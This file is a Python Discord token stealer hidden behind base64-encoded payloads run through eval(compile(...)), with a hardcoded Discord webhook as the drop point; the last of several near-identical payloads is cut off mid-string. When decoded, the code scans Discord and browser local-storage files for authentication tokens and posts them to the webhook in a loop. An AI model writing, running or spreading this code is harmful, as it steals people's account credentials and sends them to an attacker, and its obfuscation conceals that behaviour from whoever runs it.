import base64, codecs

#WEBHOOK URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1054102989721313311/_oXOFzejbOqsb8Q5-LMIqmStS7iRJNwuoi88pH8DhlDXnm-n1rIv4mHFqXdlm8G6phwE'

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszOH0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))
#38
eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszN30iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))
#37
eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszNn0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))
#...
eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszNX0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAg